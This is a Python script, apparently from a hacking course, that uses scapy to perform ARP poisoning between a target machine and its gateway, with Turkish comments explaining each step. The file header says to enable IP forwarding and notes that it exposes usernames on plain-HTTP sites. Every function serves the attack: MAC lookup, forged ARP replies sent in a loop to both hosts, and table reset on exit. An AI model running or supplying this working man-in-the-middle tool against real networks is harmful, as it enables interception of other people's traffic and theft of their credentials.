"""
NOT: Before start write "echo 1 > /proc/sys/net/ipv4/ip_forward" on the terminal
Also remember if you work on https websites you cannot see username etc. This method works for http
"""
import scapy.all as scapy
import time
import optparse
# 10.0.2.15 -> target virtual windows ip


def get_target_mac(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    # answered_list.summary()
    return answered_list[0][1].hwsrc


def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_target_mac(target_ip)

    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    # scapy.send(arp_response)
    # Terminalde sürekli yazı yazılmasını istemiyorsak "scapy.send(arp_response)" yerine
    scapy.send(arp_response, verbose=False)  # kullanilabilir.


def reset_poisoning(fooled_ip, gateway_ip):
    fooled_mac = get_target_mac(fooled_ip)
    gateway_mac = get_target_mac(gateway_ip)

    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    # scapy.send(arp_response)
    # Terminalde sürekli yazı yazılmasını istemiyorsak "scapy.send(arp_response)" yerine
    scapy.send(arp_response, verbose=False, count=5)  # kullanilabilir.


# Usage: python3 arp_poison.py -t 10.0.2.15 -g 10.0.2.1
def get_input():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target IP")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP")

    options = parse_object.parse_args()[0]
    if not options.target_ip:
        print("Enter Target IP")
    if not options.gateway_ip:
        print("Enter Gateway IP")
    return options


number = 0

user_ips = get_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip
# user_gateway -> modem ip si

try:
    while True:

        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)

        number += 2

        print("\rSending packets " + str(number), end="")
        # Sürekli yazdırmaması için -> \r aynı satırda kal, end="" sonuna bir sey yazdırma

        time.sleep(3)
        # 1 kere paket gonderemeyiz bu sebeple while aldık
        # Bir anda çok fazla göndermemesi için ise 3 saniye aralıkla gönderdik
except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_poisoning(user_target_ip, user_gateway_ip)
    reset_poisoning(user_gateway_ip, user_target_ip)

# get_target_mac("10.0.2.15") # Target IP address
# scapy.ls(scapy.ARP())
'''
op degeri default olarak 1 dir.
1 ARP request olustur anlamina geliyor.
2 ise ARP response olustur.  
'''
# hwdst = hardware destination
